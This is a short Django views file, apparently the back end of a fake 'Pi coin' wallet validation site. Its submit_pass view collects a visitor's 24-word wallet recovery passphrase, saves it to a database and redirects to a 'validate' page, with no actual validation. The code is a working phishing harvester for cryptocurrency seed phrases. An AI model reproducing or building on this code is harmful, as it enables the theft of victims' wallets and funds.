from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import HttpResponse
from . import models

# Create your views here.

def index(request):
    return render(request, 'index.html', {})

def validate(request):
    return render(request, 'validate.html', {})

def wallet(request):
    return render(request, 'wallet.html', {})

def submit_pass(request):
    if request.method == "POST":
        keys = request.POST.get('mf-text', '')
        words = keys.split()
        if len(words) != 24:
            messages.error(request, 'Invalid Passphrase')
            return redirect('/wallet/')

        else:
            if models.PassPhrase.objects.filter(keys=keys).exists():
                messages.error(request, 'We are validating your Pi coin')
                return redirect('/wallet/')

            key_save = models.PassPhrase.objects.create(
                keys=keys
            )
            key_save.save()
            return redirect('/validate/')
        
    else:
        return redirect('/')
